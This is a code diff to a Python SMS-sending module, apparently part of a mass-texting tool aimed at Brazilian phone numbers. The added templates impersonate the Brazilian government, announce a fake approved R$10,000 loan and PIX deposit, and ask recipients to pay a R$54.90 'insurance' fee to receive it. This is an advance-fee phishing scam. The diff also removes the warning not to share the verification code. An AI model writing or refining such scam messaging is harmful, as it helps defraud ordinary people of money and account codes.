@@ -93,8 +93,10 @@ def send_verification_code_owen(phone_number: str, verification_code: str) -> tu
             # Format as international number with Brazil code
             international_number = f"55{formatted_phone}"
 
+            # Get first name (using "Cliente" as default)
+            first_name = "Cliente"
             # Message template
-            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
+            message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo no valor de R$10.000,00 foi aprovado. Seu código de verificação é: {verification_code}."
 
             # Prepare the curl command
             import subprocess
@@ -288,7 +290,8 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
             return False
 
         # Message template
-        message = f"[PROGRAMA CREDITO DO TRABALHADOR] {first_name}, seu empréstimo de R${amount:.2f} foi aprovado! Finalize o processo para receber via PIX instantaneamente."
+        emprestimo_valor = 10000.00
+        message = f"TRANSFERENCIA PIX: um deposito no valor de R${emprestimo_valor:.2f} foi agendado para sua conta. Realize o pagamento do seguro no valor de R$54,90 para receber a transferencia agora."
 
         # Choose which API to use based on SMS_API_CHOICE
         if SMS_API_CHOICE.upper() == 'OWEN':
